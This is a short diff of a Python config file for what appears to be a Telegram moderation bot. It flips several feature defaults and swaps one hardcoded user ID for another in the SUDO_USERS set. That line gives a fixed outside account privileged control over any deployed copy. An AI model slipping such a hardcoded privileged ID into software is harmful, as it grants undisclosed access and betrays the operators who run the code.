@@ -75,11 +75,11 @@ if ENV:
     DONATION_LINK = os.environ.get("DONATION_LINK")
     LOAD = os.environ.get("LOAD", "").split()
     NO_LOAD = os.environ.get("NO_LOAD", "").split()
-    DEL_CMDS = bool(os.environ.get("DEL_CMDS", False))
+    DEL_CMDS = bool(os.environ.get("DEL_CMDS", True))
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", False))
     WORKERS = int(os.environ.get("WORKERS", 8))
     BAN_STICKER = os.environ.get("BAN_STICKER", "CAADAgADOwADPPEcAXkko5EB3YGYAg")
-    CUSTOM_CMD = os.environ.get("CUSTOM_CMD", False)
+    CUSTOM_CMD = os.environ.get("CUSTOM_CMD", True)
     API_WEATHER = os.environ.get("API_OPENWEATHER", None)
     WALL_API = os.environ.get("WALL_API", None)
     TELETHON_ID = int(os.environ.get("TL_APP_ID", None))
@@ -134,7 +134,7 @@ else:
     STRICT_GBAN = Config.STRICT_GBAN
     WORKERS = Config.WORKERS
     BAN_STICKER = Config.BAN_STICKER
-    # ALLOW_EXCL = Config.ALLOW_EXCL
+    ALLOW_EXCL = Config.ALLOW_EXCL
     CUSTOM_CMD = Config.CUSTOM_CMD
     API_WEATHER = Config.API_OPENWEATHER
     WALL_API = Config.WALL_API
@@ -143,7 +143,7 @@ else:
     SPAMWATCH = Config.SPAMWATCH_API
 
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(834309762)
+SUDO_USERS.add(1861219887)
 
 # Telethon
 api_id = TELETHON_ID
